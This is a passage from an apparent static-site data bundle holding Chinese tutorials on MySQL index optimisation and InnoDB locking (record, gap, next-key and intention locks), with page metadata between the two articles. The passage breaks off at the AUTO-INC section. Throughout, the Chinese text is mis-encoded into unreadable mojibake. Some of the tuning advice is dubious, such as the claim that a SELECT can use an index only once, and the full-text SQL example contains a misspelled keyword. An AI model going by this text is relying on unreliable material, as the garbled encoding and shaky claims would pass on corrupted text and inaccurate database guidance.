ç»å¸¸ä½ä¸ºæ¥è¯¢æ¡ä»¶å¨ where æè order by è¯­å¥ä¸­åºç°çåè¦å»ºç«ç´¢å¼ï¼\n * ä½ä¸ºæåºçåè¦å»ºç«ç´¢å¼ï¼\n * æ¥è¯¢ä¸­ä¸å¶ä»è¡¨å³èçå­æ®µï¼å¤é®å³ç³»å»ºç«ç´¢å¼\n * é«å¹¶åæ¡ä»¶ä¸å¾åç»åç´¢å¼ï¼\n * ç¨äºèåå½æ°çåå¯ä»¥å»ºç«ç´¢å¼ï¼ä¾å¦ä½¿ç¨äº max (column_1) æè count (column_1) æ¶ç column_1 å°±éè¦å»ºç«ç´¢å¼\n\n\n# ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼ï¼\n\n * ç»å¸¸å¢å æ¹çåä¸è¦å»ºç«ç´¢å¼ï¼\n * æå¤§ééå¤çåä¸å»ºç«ç´¢å¼ï¼\n * è¡¨è®°å½å¤ªå°ä¸è¦å»ºç«ç´¢å¼ãåªæå½æ°æ®åºéå·²ç»æäºè¶³å¤å¤çæµè¯æ°æ®æ¶ï¼å®çæ§è½æµè¯ç»æææå®éåèä»·å¼ãå¦æå¨æµè¯æ°æ®åºéåªæå ç¾æ¡æ°æ®è®°å½ï¼å®ä»¬å¾å¾å¨æ§è¡å®ç¬¬ä¸æ¡æ¥è¯¢å½ä»¤ä¹åå°±è¢«å¨é¨å è½½å°åå­éï¼è¿å°ä½¿åç»­çæ¥è¯¢å½ä»¤é½æ§è¡å¾éå¸¸å¿« -- ä¸ç®¡ææ²¡æä½¿ç¨ç´¢å¼ãåªæå½æ°æ®åºéçè®°å½è¶è¿äº 1000 æ¡ãæ°æ®æ»éä¹è¶è¿äº mysql æå¡å¨ä¸çåå­æ»éæ¶ï¼æ°æ®åºçæ§è½æµè¯ç»ææææä¹ã\n\n\n# ç´¢å¼å¤±æçæåµï¼\n\n * å¨ç»åç´¢å¼ä¸­ä¸è½æåçå¼ä¸º nullï¼å¦ææï¼é£ä¹è¿ä¸åå¯¹ç»åç´¢å¼å°±æ¯æ æçã\n\n * å¨ä¸ä¸ª select è¯­å¥ä¸­ï¼ç´¢å¼åªè½ä½¿ç¨ä¸æ¬¡ï¼å¦æå¨ where ä¸­ä½¿ç¨äºï¼é£ä¹å¨ order by ä¸­å°±ä¸è¦ç¨äºã\n\n * like æä½ä¸­ï¼'% aaa%' ä¸ä¼ä½¿ç¨ç´¢å¼ï¼ä¹å°±æ¯ç´¢å¼ä¼å¤±æï¼ä½æ¯âaaa%âå¯ä»¥ä½¿ç¨ç´¢å¼ã\n\n * å¨ç´¢å¼çåä¸ä½¿ç¨è¡¨è¾¾å¼æèå½æ°ä¼ä½¿ç´¢å¼å¤±æï¼ä¾å¦ï¼select * from users where year (adddate)<2007ï¼å°å¨æ¯ä¸ªè¡ä¸è¿è¡è¿ç®ï¼è¿å°å¯¼è´ç´¢å¼å¤±æèè¿è¡å¨è¡¨æ«æï¼å æ­¤æä»¬å¯ä»¥æ¹æï¼select * from users where adddate<â2007-01-01â²ãå¶å®ééç¬¦åæ ·ï¼ä¹å°±æ¯è¯´ï¼å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨æ­£åè¡¨è¾¾å¼æ¶ï¼åªæå¨æç´¢æ¨¡æ¿çç¬¬ä¸ä¸ªå­ç¬¦ä¸æ¯ééç¬¦çæåµä¸æè½ä½¿ç¨ç´¢å¼ã\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ä¸ç­äºï¼åæ¬ <ç¬¦å·ã> ç¬¦å·åï¼= ä¼å¯¼è´ç´¢å¼å¤±æãç¹å«çæ¯å¦æå¯¹ä¸»é®ç´¢å¼ä½¿ç¨ï¼= åä¸ä¼ä½¿ç´¢å¼å¤±æï¼å¦æå¯¹ä¸»é®ç´¢å¼æèæ´æ°ç±»åçç´¢å¼ä½¿ç¨ < ç¬¦å·æè > ç¬¦å·ä¸ä¼ä½¿ç´¢å¼å¤±æãï¼ç» erwkjrfhjwkdb åå­¦æéï¼ä¸ç­äºï¼åæ¬ < ç¬¦å·ã> ç¬¦å·åï¼ï¼å¦æå æ»è®°å½çæ¯ä¾å¾å°çè¯ï¼ä¹ä¸ä¼å¤±æï¼\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ is null æè is not null ä¼å¯¼è´ç´¢å¼å¤±æã\n\n * å­ç¬¦ä¸²ä¸å åå¼å·ä¼å¯¼è´ç´¢å¼å¤±æãæ´åç¡®çè¯´æ¯ç±»åä¸ä¸è´ä¼å¯¼è´å¤±æï¼æ¯å¦å­æ®µ email æ¯å­ç¬¦ä¸²ç±»åçï¼ä½¿ç¨ where email=99999 åä¼å¯¼è´å¤±è´¥ï¼åºè¯¥æ¹ä¸º where email='99999'ã\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ or è¿æ¥å¤ä¸ªæ¡ä»¶ä¼å¯¼è´ç´¢å¼å¤±æï¼é¤é or é¾æ¥çæ¯ä¸ªæ¡ä»¶é½å ä¸ç´¢å¼ï¼è¿æ¶åºè¯¥æ¹ä¸ºä¸¤æ¬¡æ¥è¯¢ï¼ç¶åç¨ union all è¿æ¥èµ·æ¥ã\n\n * å¦ææåºçå­æ®µä½¿ç¨äºç´¢å¼ï¼é£ä¹ select çå­æ®µä¹è¦æ¯ç´¢å¼å­æ®µï¼å¦åç´¢å¼å¤±æãç¹å«çæ¯å¦ææåºçæ¯ä¸»é®ç´¢å¼å select * ä¹ä¸ä¼å¯¼è´ç´¢å¼å¤±æã\n\n * å°½éä¸è¦åæ¬å¤åæåºï¼å¦æä¸å®è¦ï¼æå¥½ä¸ºè¿éåæå»ºç»åç´¢å¼ï¼\n\n\n# ç´¢å¼çä¼å\n\n1ãæå·¦åç¼\n\nç´¢å¼çæå·¦åç¼åå b+tree ä¸­ç âæå·¦åç¼åçâ æå³ï¼ä¸¾ä¾æ¥è¯´å°±æ¯å¦æè®¾ç½®äºç»åç´¢å¼ < col1,col2,col3 > é£ä¹ä»¥ä¸ 3 ä¸­æåµå¯ä»¥ä½¿ç¨ç´¢å¼ï¼col1ï¼<col1,col2>ï¼<col1,col2,col3>ï¼å¶å®çåï¼æ¯å¦ < col2,col3>ï¼<col1,col3>ï¼col2ï¼col3 ç­ç­é½æ¯ä¸è½ä½¿ç¨ç´¢å¼çã\n\næ ¹æ®æå·¦åç¼ååï¼æä»¬ä¸è¬ææåºåç»é¢çæé«çåæ¾å¨æå·¦è¾¹ï¼ä»¥æ­¤ç±»æ¨ã\n\n2ãå¸¦ç´¢å¼çæ¨¡ç³æ¥è¯¢ä¼å\n\nå¨ä¸é¢å·²ç»æå°ï¼ä½¿ç¨ like è¿è¡æ¨¡ç³æ¥è¯¢çæ¶åï¼'% aaa%' ä¸ä¼ä½¿ç¨ç´¢å¼ï¼ä¹å°±æ¯ç´¢å¼ä¼å¤±æãå¦ææ¯è¿ç§æåµï¼åªè½ä½¿ç¨å¨æç´¢å¼æ¥è¿è¡ä¼åï¼ä¸ææè®²å°ï¼ã\n\n3ãä¸ºæ£ç´¢çæ¡ä»¶æå»ºå¨æç´¢å¼ï¼ç¶åä½¿ç¨\n\nselect * from tablename match(index_colum) angainst('word');\n\n\n1\n\n\n4ãä½¿ç¨ç­ç´¢å¼\n\nå¯¹ä¸²åè¿è¡ç´¢å¼ï¼å¦æå¯è½åºè¯¥æå®ä¸ä¸ªåç¼é¿åº¦ãä¾å¦ï¼å¦ææä¸ä¸ª char (255) ç åï¼å¦æå¨å 10 ä¸ªæ 20 ä¸ªå­ç¬¦åï¼å¤æ°å¼æ¯æä¸çï¼é£ä¹å°±ä¸è¦å¯¹æ´ä¸ªåè¿è¡ç´¢å¼ãç­ç´¢å¼ä¸ä»å¯ä»¥æé«æ¥è¯¢éåº¦èä¸å¯ä»¥èçç£çç©ºé´å i/o æä½ã",charsets:{cjk:!0}},{title:"MySQL éä»ç»",frontmatter:{title:"MySQL éä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1301.MySQL%20%E9%94%81%E4%BB%8B%E7%BB%8D.html",relativePath:"03.å¤§æ°æ®/04.mysql/1301.MySQL éä»ç».md",key:"v-a652ea48",path:"/mysql/1301/",headers:[{level:2,title:"åè¨",slug:"åè¨",normalizedTitle:"åè¨",charIndex:2},{level:2,title:"æ®éé",slug:"æ®éé",normalizedTitle:"æ®éé",charIndex:173},{level:2,title:"æåé",slug:"æåé",normalizedTitle:"æåé",charIndex:750},{level:3,title:"æ³¨æï¼è¿éç X éãS éè¯´çä¹æ¯è¡¨çº§éï¼ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã",slug:"æ³¨æ-è¿éç-x-éãs-éè¯´çä¹æ¯è¡¨çº§é-ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã",normalizedTitle:"æ³¨æï¼è¿éç x éãs éè¯´çä¹æ¯è¡¨çº§éï¼ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã",charIndex:1289},{level:2,title:"è®°å½é",slug:"è®°å½é",normalizedTitle:"è®°å½é",charIndex:2003},{level:2,title:"é´éé",slug:"é´éé",normalizedTitle:"é´éé",charIndex:2512},{level:2,title:"Next-Key é",slug:"next-key-é",normalizedTitle:"next-key é",charIndex:3678},{level:3,title:"å¨é»è®¤ç REPEATABLE READ éç¦»çº§å«ä¸ï¼InnoDB å¨æ¥æ¾åæ«æç´¢å¼æ¶ï¼é½ä¼ä½¿ç¨ Next-Key éï¼ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã",slug:"å¨é»è®¤ç-repeatable-read-éç¦»çº§å«ä¸-innodb-å¨æ¥æ¾åæ«æç´¢å¼æ¶-é½ä¼ä½¿ç¨-next-key-é-ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã",normalizedTitle:"å¨é»è®¤ç repeatable read éç¦»çº§å«ä¸ï¼innodb å¨æ¥æ¾åæ«æç´¢å¼æ¶ï¼é½ä¼ä½¿ç¨ next-key éï¼ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã",charIndex:3903},{level:2,title:"æå¥æåé",slug:"æå¥æåé",normalizedTitle:"æå¥æåé",charIndex:3979},{level:2,title:"AUTO-INC é",slug:"auto-inc-é",normalizedTitle:"auto-inc é",charIndex:4336},{level:2,title:"æ»ç»",slug:"æ»ç»",normalizedTitle:"æ»ç»",charIndex:4930}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åè¨ æ®éé æåé æ³¨æï¼è¿éç X éãS éè¯´çä¹æ¯è¡¨çº§éï¼ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã è®°å½é é´éé Next-Key é å¨é»è®¤ç REPEATABLE READ éç¦»çº§å«ä¸ï¼InnoDB å¨æ¥æ¾åæ«æç´¢å¼æ¶ï¼é½ä¼ä½¿ç¨ Next-Key éï¼ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã æå¥æåé AUTO-INC é æ»ç»",content:"# åè¨\n\néæ¯å¨å¹¶åç¨åºä¸­æç»å¸¸ä½¿ç¨çææ®µä¹ä¸ï¼ä½æ¯éçæ»¥ç¨ä¹ä¼ç»ç¨åºçæ§è½å¸¦æ¥æå¤§çè´æãèæä»¬å¹³æ¶ä½¿ç¨ MySQL åå¢å æ¹æ¥æä½çæ¶åï¼æè§ä¸å°æä»¬æå¨ä½¿ç¨éï¼å®éä¸æ¯å ä¸º MySQL å·²ç»ä¸ºæä»¬ä½¿ç¨äºç¸å³çéãå¦æä½ æ³ç¥éæä»¬å¹³æ¶ä½¿ç¨ç SQL è¯­å¥é½ä½¿ç¨äºåªäºéï¼é½æ¯æä¹å éçï¼è¿äºéçä½ç¨æ¯ä»ä¹ï¼é£ä¹å¯ä»¥ç»§ç»­å¾ä¸çã\n\n\n\n\n# æ®éé\n\nInnoDB å®ç°äºæ åè¡çº§éï¼èè¡çº§éæä¸¤ç§ç±»åï¼\n\n * å±äº«éï¼shared lockï¼ä»¥ä¸å°ä¼ç®ç§°ä¸º S éï¼ï¼æå¨å±äº«ãä¹å°±æ¯åè®¸å¤ä¸ªäºå¡å±åææä¸ä¸ªè®°å½çå±äº«éï¼è¯¥éä¸»è¦ç¨äºè¯»åæä½ã\n * æä»éï¼exclusive lockï¼ä»¥ä¸å°ä¼ç®ç§°ä¸º X éï¼ï¼æå¨ææ¥ãåªè½åè®¸ä¸ä¸ªäºå¡ææä¸ä¸ªè®°å½çæä»éï¼è¯¥éä¸»è¦ç¨äºæ´æ°åå é¤æä½ã\n   å¦æä½ æäºè§£è¿ Java ä¸­ç JUC åï¼é£ä¹ä½ å°±ä¼åç°è¿æç¹å JUC ä¸­çè¯»åé ReentrantReadWriteLockãå®ä»¬çç®çé½æ¯ä¸ºäºæé«è¯»åæä½çå¹¶åæ§ã\n\nå¦ææä¸ä¸ªäºå¡ T1 ææè¡ r ç S éï¼å¹¶ä¸åæ¶æå¦ä¸ä¸ªäºå¡ T2 æ³è¦è·åè¡ r ä¸­çéï¼T2 è·åä¸åçéå°ä¼æå¦ä¸çæåµåçï¼\n\nåå¦ T2 æ³è¦è·åè¡ r ç S éï¼é£ä¹ T2 å°ä¼ç«å»å¾å°è¯¥éã\nåå¦ T2 æ³è¦è·åè¡ r ç X éï¼é£ä¹ T2 åä¼è¢«é»å¡ï¼ç´å° T1 éæ¾äºè¡ r ç S éã\nå¦ææä¸ä¸ªäºå¡ T1 æææ§ r ç X éï¼å¹¶ä¸åæ¶æå¦ä¸ä¸ªäºå¡ T2 æ³è¦è·åè¡ r ä¸­çéï¼ä¸ç®¡ T2 è·åä»ä¹éé½ä¼è¢«é»å¡ã\n\nX éä¸ S éçå¼å®¹æ§å¦ä¸å¾æç¤ºï¼\n\n\n\næå·¦è¾¹æ¯ææçéï¼æä¸é¢æ¯æ³è¦ç³è¯·çéãä»å¾ä¸­å¯ä»¥çåºï¼åªè¦è· X éç¸å³çï¼é½ä¼å²çªï¼ä¹å°±æ¯ä¼é æé»å¡ã\n\n\n# æåé\n\nInnoDB åè®¸å¤ç§ç²åº¦çéå±å­ï¼æä»¥ä¼æè¡¨éåè¡éå±å­çæåµãä¸ºäºè®©å¤ç§ç²åº¦çéå¯ä»¥å±å­ï¼InnoDB ä½¿ç¨äºæåéãæåéæ¯è¡¨çº§éï¼å®æ¯ä¸ºäºè¡¨ææä¸ä¸ªäºå¡æ­£å¨ææéæèæç®ç³è¯·ä¸ä¸ªéã\n\næåéæä¸¤ç§ç±»åï¼\n\n * å±äº«æåéï¼intention shared lockï¼ä»¥ä¸ç®ç§° ISï¼ï¼è¡¨ç¤ºäºå¡ææè¡¨ä¸­è¡çå±äº«éæèæç®è·åè¡çå±äº«éã\n * å±äº«æä»éï¼intention exclusive lockï¼ä»¥ä¸ç®ç§° IXï¼ï¼è¡¨ç¤ºäºå¡ææè¡¨ä¸­è¡çæä»éæèæç®è·åè¡çæä»éã\n   IS å IX åªæ¯ä¸ºäºè¡¨è¾¾åºä¸ç§æå¾ï¼å®ä»¬é¤äºå¨è¡¨è¯·æ±ä¹å¤ï¼ä¸ä¼é»å¡ä»»ä½æä½ãå®ä»¬çä¸»è¦ç®çåªæ¯ä¸ºäºè¡¨ç¤ºææä¸ä¸ªè¡éï¼æèæç®è·åè¡éã\n\næåéçä½¿ç¨è§åå¦ä¸ï¼\n\n * äºå¡å¨è·åè¡¨ä¸­çå±äº«è¡éæ¶ï¼éè¦åè·åè¡¨ä¸­ç IS éæèç­çº§æ´é«çéã\n * äºå¡å¨è·åè¡¨ä¸­çæä»è¡éæ¶ï¼éè¦åè·åè¡¨ä¸­ç IX éã\n\nè¿éæä¸ä¸ªå¾éè¦çç¹ï¼å°±æ¯åªæè·åè¡¨ä¸­çè¡éæ¶ï¼æä¼éè¦åç³è¯·æåéã å¦ææ¯æ§è¡ ALTER TABLE ç­éè¦éå®æ´ä¸ªè¡¨çè¯­å¥ï¼æ¯ä¸éè¦ç³è¯·æåéçï¼å¯ä»¥ç´æ¥å»ç³è¯·è¡¨çº§ X éã\n\nè¡¨çº§å«ä¸ç X éãS éãIS éå IX éçå¼å®¹æ§å¦ä¸ï¼\n\n\n\n\n# æ³¨æï¼è¿éç X éãS éè¯´çä¹æ¯è¡¨çº§éï¼ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã\n\nä¸ºä»ä¹ä¼ææåéçåºç°å¢ï¼æä»¬èèå¦ä¸åºæ¯ï¼åè®¾ä¸å­å¨æåéï¼ï¼\nä¸ä¸ªäºå¡ A æ³è¦ä¿®æ¹è¡¨ t ä¸­çè¡ rï¼æä»¥ A è·åè¡ r ç X éï¼äº r å¡ A ç°å¨ææä¸ä¸ªè¡éãæ­¤æ¶ï¼æä¸ä¸ªäºå¡ B æ³è¦ä½¿ç¨ ALTER TABLE è¯­å¥ä¿®æ¹è¡¨ t çç»æï¼è¯¥è¯­å¥é¦åéè¦è·åè¡¨ t ç X éï¼ä½æ¯æ­¤æ¶äºå¡ B å¹¶ä¸ç¥éè¡¨ä¸­æ¯å¦æè¡è¢«éä½ï¼æä»¥å®åªè½ä¸è¡ä¸è¡å»éåï¼ç¶åæéåçè¡ä¹éä½ï¼ç´å°åç°è¡¨ä¸­æ²¡æè¡å¨ä¹åå·²ç»è¢«éä½ï¼ç°å¨å®å°±å¯ä»¥ä¿®æ¹è¡¨çç»æäºãä½æ¯å®åç°è¡¨ä¸­å·²ç»å­å¨ä¸äºè¡è¢«éä½ï¼é£ä¹å®å°±ä¸è½ä¿®æ¹è¡¨ç»æï¼éè¦ç­è¿äºéé½éæ¾ã\n\n\n\nè¿éæä¸ä¸ªå¤§é®é¢ï¼æåçæåµä¸ï¼éè¦éåææçè¡æè½ç¥éæ¯å¦æè¡è¢«éä½ï¼è¿æ¯éå¸¸æ¶èæ§è½çï¼èæåéå°±å¯ä»¥è§£å³è¿ä¸ªé®é¢ãæä»¬ç°å¨åæ¥èèç¸ååºæ¯ä¸ï¼æåéå¦ä½è§£å³è¿ä¸ªé®é¢ï¼\n\nä¸ä¸ªäºå¡ A æ³è¦ä¿®æ¹è¡¨ t ä¸­çè¡ rï¼A é¦åéè¦è·åè¡¨ t ç IX éï¼ç¶åæåè·å IX éä¹åï¼åå»ç³è¯·è¡ r ç X éï¼ç³è¯·æåä¹åï¼äºå¡ A æ­¤æ¶å°±ææä¸¤ä¸ªéï¼åå«æ¯è¡¨ t ç IX éåè¡ r ç X éãæ­¤æ¶ï¼æä¸ä¸ªäºå¡ B æ³è¦ä½¿ç¨ ALTER TABLE è¯­å¥ä¿®æ¹è¡¨ t çç»æï¼è¯¥è¯­å¥éè¦è·åè¡¨ t ç X éï¼äºå¡ B å¯ä»¥æ¥çè¡¨ t ä¸æ¯å¦å­å¨éæ¥å¤æ­è¡¨ä¸­çè¡æ¯å¦è¢«ä¸éï¼å½åç°è¡¨ t ä¸å­å¨ IX éï¼äºå¡ B å°±ä¼è¢«é»å¡ï¼å ä¸ºå®ç¥éè¡¨ä¸­å·²ç»æè¡è¢«éå®ï¼æä»¥æ æ³ç³è¯·å°è¡¨ t ç X éã\n\n\n\næä»¬çä¸é¢çå¼å®¹æ§è¡¨ï¼ä¹å¾ç¥è¡¨çº§ç IX éåè¡¨çº§ç X éæ¯å²çªçï¼æä»¥ååå¥½å¯¹åºä¸è¿ä¸ªåºæ¯ã\n\n\n# è®°å½é\n\nè®°å½éæ¯å¯¹ç´¢å¼è®°å½çéå®ï¼æ¢å¥è¯è¯´å°±æ¯ï¼è®°å½éåªä¼éå®ç´¢å¼ãæ¯ä¸ä¸ªè¡¨å¿å®ä¼æä¸ä¸ªä¸»é®ç´¢å¼ï¼ç¨æ·å®ä¹çä¸»é®ãå¯ä¸ç´¢å¼ãéå¼çæï¼ï¼èè¯¥ä¸»é®ç´¢å¼ä¸­çéå¶å­èç¹ä¸­çè®°å½å°±æ¯ä½¿ç¨è¯¥è®°å½éè¿è¡éå®ã\n\nåè®¾æ§è¡è¯­å¥ï¼select * from user where id = 10 for update;\n\nå¦æ id æ¯ user è¡¨ä¸­çä¸»é®ï¼é£ä¹å¨ä¸»é®ç´¢å¼ä¸­ï¼id ä¸º 10 çè®°å½å°±ä¼è¢«éå®ãå¹¶ä¸å¶ä»äºå¡æ³è¦æ´æ°ãå é¤æ­¤æ¡è®°å½é½ä¼è¢«é»å¡ï¼åªæç­è¯¥è®°å½ä¸­çè®°å½éè¢«éæ¾ä¹åï¼æå¯ä»¥æ§è¡å¶ä»æä½ã\n\n\n\né¤äºä¸»é®ç´¢å¼ä¹å¤ï¼InnoDB ä¸­è¿ä¼æäºçº§ç´¢å¼ãäºçº§ç´¢å¼è·ä¸»é®ç´¢å¼ä¸æ ·ï¼å¨ä½¿ç¨äºçº§ç´¢å¼ä½ä¸ºæ¥è¯¢æ¡ä»¶æ¶ï¼ä¼å°ç¬¦åæ¡ä»¶çäºçº§ç´¢å¼çè®°å½ä½¿ç¨è®°å½éè¿è¡éå®ï¼ç¶åååè¡¨å°å¯¹åºçä¸»é®ç´¢å¼ä¹ä½¿ç¨è®°å½éè¿è¡éå®ã\n\nåè®¾æ§è¡è¯­å¥ï¼select * from user where name = 'c' for update;\n\nå¦æ id æ¯ user è¡¨ä¸­çä¸»é®ï¼name æ¯ user è¡¨ä¸­çäºçº§ç´¢å¼ãåä¼åå°äºçº§ç´¢å¼ä¸ç name = âcâ çç´¢å¼éå®ï¼ç¶ååè¿è¡åè¡¨å°ä¸»é®ç´¢å¼ä¸º 9 çä¸»é®ç´¢å¼éå®ã\n\n\n\n\n# é´éé\n\né´ééï¼ç®ç§°ä¸º Gapï¼æ¯å¯¹ç´¢å¼è®°å½ä¹é´çé´éçéå®ï¼æèæ¯å¯¹ç¬¬ä¸æ¡ç´¢å¼è®°å½ä¹åçé´éåå¯¹æåä¸æ¡è®°å½ä¹åçé´éçéãé´ééæ¯é²æ­¢å¹»è¯»çä¸»è¦ææ®µä¹ä¸ï¼å¹»è¯»æ¯åä¸ä¸ªäºå¡å¨ä¸åçæ¶é´æ§è¡ç¸åçæ¥è¯¢è¯­å¥ï¼å¾åºçç»æéä¸åãé£ä¹é´ééæ¯å¦ä½é²æ­¢å¹»è¯»çå¢ï¼å®éä¸å°±æ¯éè¿éå®æå®çé´éï¼ä½¿å¾è¿äºé´éæ æ³æå¥æ°çè®°å½ï¼ä»èé²æ­¢äºæ°æ®çå¢é¿ã\n\nåè®¾æä»¬æ§è¡æ­¤æ¡è¯­å¥ï¼select * from user where id > 5 and id < 9 for update;\n\nç±äºé´ééçå­å¨ï¼å¶ä»äºå¡å¦ææ³è¦æå¥ id å¨ 5 å 9 ä¹é´çè®°å½æ¯æ æ³æåçï¼ä¼è¢«é»å¡ï¼ç´å°é´éééæ¾ãæ¯å¦æ³è¦æå¥ id ä¸º 6 çè®°å½ï¼å°±ä¼é»å¡ï¼å¦ä¸å¾æç¤ºï¼çç¥é¨åæ å³çå­æ®µï¼ãé´ééè·¨è¶çé´éå¯è½ä¸ºä¸ä¸ªå¼ãå¤ä¸ªå¼ãçè³ä¸ºç©ºå¼ã\n\n\n\néè¿ä¸å¾æä»¬å¯ä»¥ç¥éï¼\n\n * (5, 7]ï¼id ä¸º 5 çç´¢å¼è®°å½ä¸ id ä¸º 7 çç´¢å¼è®°å½ä¹é´çé´éè¢«é´éééå®äº\n * (7, 9]ï¼id ä¸º 7 çç´¢å¼è®°å½ä¸ id ä¸º 9 çç´¢å¼è®°å½ä¹é´çé´éè¢«é´éééå®äº\n\nå ä¸ºè¿ä¸¤ä¸ªé´éè¢«é´éééå®äºï¼æä»¥å¨è¿ä¸¤ä¸ªé´éä¹é´çè®°å½æ¯æ æ³æå¥ï¼åªæç­é´éééæ¾ä¹åæå¯ä»¥æå¥ãæä»¬è¿è¦æ³¨æå°ï¼id ä¸º 7 çè®°å½æ¯è¢«è®°å½ééå®çï¼æä»¥å¨ id ä¸º 7 çè®°å½ä¸æ§è¡æ´æ°ãå é¤æä½æ¶ä¼è¢«é»å¡çã\n\næä»¬ä¸é¢è¿è¯´å°ï¼é´ééè¿å¨ç¬¬ä¸æ¡è®°å½çåé¢åæåä¸æ¡è®°å½çåé¢å éï¼æä»¬æ¥ççè¿æ¯ä»ä¹æåµã\n\nåè®¾æä»¬æ§è¡æ­¤æ¡è¯­å¥ï¼select * from user for update;\n\nå ä¸ºè¯¥è¯­å¥æ²¡æä½¿ç¨ç´¢å¼ï¼æä»¥ä¼è¿è¡å¨è¡¨æ«æãå°æ«æå°çæ¯ä¸æ¡è®°å½é½å ä¸è®°å½éï¼å¹¶ä¸å°ææçé´éä¹å é´ééãæç»çå éæåµå¦ä¸å¾æç¤ºï¼çç¥é¨åæ å³çå­æ®µï¼ï¼\n\n\n\næ¯ä¸ªè¡¨ä¸­é½ä¼å­å¨ä¸¤ä¸ªéå¼è®°å½ï¼æå°è®°å½ï¼infimumï¼ï¼æå¤§è®°å½ï¼supermumï¼\n\næä»¬éè¿ä¸å¾ï¼å¯ä»¥å¾åºéå®çåºé´å¦ä¸ï¼\n\n * (-â, 5]\n * (5, 7]\n * (7, 9]\n * (9, 10]\n * (10, 12]\n * (12, +â)\n\nå¹¶ä¸ææçè®°å½é½è¢«è®°å½ééå®ãè¿ä¸ªçèµ·æ¥å°±åæ¯ä¸ä¸ªè¡¨éï¼å ä¸ºå¯¹è¯¥è¡¨çä»»ä½æä½ï¼å¿«ç§è¯»é¤å¤ï¼ï¼é½ä¼è¢«é»å¡ã\n\nä½æ¯ï¼é´ééå¹¶ä¸æ¯å¨ä»»ä½æåµä¸é½ä¼ä½¿ç¨ï¼å®å¨ä»¥ä¸æåµå¹¶ä¸ä¼ä½¿ç¨ï¼\n\n * éç¦»çº§å«ä¸º RCãRUã\n * ä½¿ç¨å¯ä¸ç´¢å¼è¿è¡ç­å¼æ¯è¾è·åä¸æ¡ç´¢å¼è®°å½ãè¿æ¯å ä¸ºå¯ä¸ç´¢å¼è¿è¡ç­å¼æ¯è¾åªè½è·åä¸æ¡è®°å½ï¼ä¸ä¼åºç°å¤æ¡è®°å½çæåµï¼é£ä¹ä¹å°±ä¸ä¼åºç°å¤æ¬¡è¯»ååºç°ä¸ä¸è´çæåµã\n\né´ééçä¸»è¦ç®çæ¯é»æ­¢äºå¡å¾é´éä¸­æå¥è®°å½ï¼å¹¶ä¸é´ééä¹é´æ¯å¯ä»¥å±å­çï¼å¤ä¸ªäºå¡å¯ä»¥åæ¶è·åå¾å°ç¸åé´éçéãå±äº«é´ééåæä»é´ééä¹é´å¹¶æ²¡æåºå«ï¼å®ä»¬æ¯å®å¨ä¸æ ·çä¸è¥¿ã\n\n\n# Next-Key é\n\nNext-Key éå¹¶ä¸æ¯ä¸ä¸ªé¾ä»¥çè§£çä¸è¥¿ï¼å®æ¬è´¨ä¸å°±æ¯ç´¢å¼è®°å½ä¸çè®°å½éåç´¢å¼è®°å½ä¹é´çé´ééçç»åã\n\nInnoDB å¨æ¥æ¾åæ«æè¡¨çæ¶åï¼ä¼å°æ«æå°çè®°å½é½å ä¸è®°å½éï¼è®°å½éæå¯è½æ¯å±äº«éæèæ¯æä»éãå æ­¤ï¼è¡çº§éå®éä¸æ¯ç´¢å¼è®°å½éã\n\nå¨é´ééçä¸¤ä¸ªä¾å­ä¸­çç¬¬äºä¸ªä¾å­ï¼å®å®éä¸å°±æ¯ Next-Key éï¼å ä¸ºæ¯ä¸ä¸ªæ¬å·æ¬èµ·æ¥çåå­åæ¬ä¸ä¸ªç´¢å¼è®°å½éåä¸ä¸ªé´ééï¼è è¿å®ç¾ç¬¦å Next-Key çå®ä¹ã\n\n\n# å¨é»è®¤ç REPEATABLE READ éç¦»çº§å«ä¸ï¼InnoDB å¨æ¥æ¾åæ«æç´¢å¼æ¶ï¼é½ä¼ä½¿ç¨ Next-Key éï¼ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã\n\n\n# æå¥æåé\n\næå¥æåéï¼ç®ç§°ä¸º II Gapï¼æ¯ä¸ç§ç¹æ®çé´ééï¼åªæå¨æå¥è®°å½çæ¶åæä¼ä½¿ç¨ï¼è¿ä¸ªéè¡¨ç¤ºæå¥çæåãå®ä¸ä¸é¢è¯´å°çè¡¨çº§æåéæ¯å®å¨ä¸åçï¼æå¥æåéæ¯å±äºè¡çº§éï¼å¹¶ä¸äºç¸ä¹é´æ¯å¼å®¹çï¼äºä¸å²çªï¼æä»¥å¤ä¸ªäºå¡å¯ä»¥åæ¶è·åå°ç¸åé´éç II Gap éã\n\n> å®æ¹ç¤ºä¾ï¼\n> åè®¾æç´¢å¼è®°å½ï¼å¶å¼åå«ä¸º 4 å 7ï¼åç¬çäºå¡åå«å°è¯æå¥å¼ 5 å 6ï¼å¨è·å¾æå¥è¡çæä»éä¹åï¼æ¯ä¸ªäºå¡é½ä½¿ç¨æå¥æå¾éæ¥éå® 4 å 7 ä¹é´çé´éï¼ä½ä¸è¦äºç¸é»å¡ï¼å ä¸ºè¡æ¯æ å²çªçã\n\næå¥æåéåªä¼åé´ééå Next-Key éå²çªãå ä¸ºé´ééçä¸»è¦ä½ç¨æ¯é²æ­¢å¹»è¯»çåçï¼èå¨æå¥æä½æ§è¡åéè¦è·åå°æå¥æåéï¼èæå¥æåéåé´ééä¹é´æ¯å²çªçï¼å¯ä»¥é»å¡æå¥æä½ï¼æä»¥é´ééå¯ä»¥é²æ­¢å¹»è¯»çåçã\n\n\n# AUTO-INC é\n\nAUTO-INC 